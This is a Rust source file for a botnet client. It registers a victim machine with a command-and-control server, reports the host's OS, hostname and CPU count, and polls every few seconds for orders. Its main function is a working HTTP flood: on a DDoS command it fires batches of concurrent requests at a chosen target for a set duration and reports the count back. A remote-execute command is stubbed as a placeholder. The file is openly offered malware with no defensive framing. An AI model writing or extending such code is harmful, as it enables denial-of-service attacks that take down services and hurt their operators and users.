use std::env;
use std::time::Duration;
use sysinfo::{System, SystemExt, CpuExt};
use serde::{Deserialize, Serialize};
use rand::Rng;
use tokio::time;

#[derive(Debug, Serialize, Deserialize)]
struct BotInfo {
    id: String,
    os: String,
    hostname: String,
    cpu_cores: usize,
    status: String,
}

#[derive(Debug, Serialize, Deserialize)]
enum CommandType {
    Ping,
    Execute(String),
    DDoS { target: String, duration: u64 },
    Stop,
}

#[derive(Debug, Serialize, Deserialize)]
struct BotCommand {
    command_id: String,
    command: CommandType,
}

#[derive(Debug, Serialize, Deserialize)]
struct CommandResult {
    bot_id: String,
    result: String,
}

struct BotClient {
    id: String,
    c2_server: String,
    client: reqwest::Client,
}

impl BotClient {
    fn new(c2_server: String) -> Self {
        let mut rng = rand::thread_rng();
        BotClient {
            id: format!("bot-{}", rng.gen::<u32>()),
            c2_server,
            client: reqwest::Client::new(),
        }
    }

    async fn register(&self) {
        let mut sys = System::new_all();
        sys.refresh_all();

        let info = BotInfo {
            id: self.id.clone(),
            os: sys.name().unwrap_or("Unknown".into()),
            hostname: sys.host_name().unwrap_or("Unknown".into()),
            cpu_cores: sys.cpus().len(),
            status: "Ready".into(),
        };

        let url = format!("{}/register", self.c2_server);
        match self.client.post(&url).json(&info).send().await {
            Ok(_) => println!("✅ Registered as {}", self.id),
            Err(e) => println!("⚠️ Failed to register: {}", e),
        }
    }

    async fn attack(&self, target: &str, duration: u64) -> String {
        println!("🚀 LAUNCHING ATTACK ON {} ({}s)", target, duration);
        let start = std::time::Instant::now();
        let mut tasks = Vec::new();
        let client = self.client.clone();
        let target_url = target.to_string();
        let mut count = 0;

        while start.elapsed().as_secs() < duration {
            for _ in 0..20 {
                let c = client.clone();
                let t = target_url.clone();
                tasks.push(tokio::spawn(async move {
                    let _ = c.get(&t).timeout(Duration::from_secs(2)).send().await;
                }));
                count += 1;
            }
            time::sleep(Duration::from_millis(50)).await; 
        }

        for t in tasks { let _ = t.await; }
        format!("Attacked {} with {} requests", target, count)
    }

    async fn run(&self) {
        self.register().await;
        
        loop {
            let url = format!("{}/commands/{}", self.c2_server, self.id);
            if let Ok(resp) = self.client.get(&url).send().await {
                if let Ok(cmds) = resp.json::<Vec<BotCommand>>().await {
                    for cmd in cmds {
                        let res_str = match cmd.command {
                            CommandType::DDoS { target, duration } => {
                                self.attack(&target, duration).await
                            },
                            CommandType::Execute(c) => format!("Executed: {}", c), // Placeholder RCE
                            _ => "Pong".to_string(),
                        };

                        let report = CommandResult { bot_id: self.id.clone(), result: res_str };
                        let _ = self.client.post(format!("{}/result", self.c2_server)).json(&report).send().await;
                    }
                }
            }
            time::sleep(Duration::from_secs(3)).await;
        }
    }
}

#[tokio::main]
async fn main() {
    let c2 = env::var("COMMANDER_URL").unwrap_or("http://localhost:8080".to_string());
    println!("🔌 Connecting to C2: {}", c2);
    let bot = BotClient::new(c2);
    bot.run().await;
}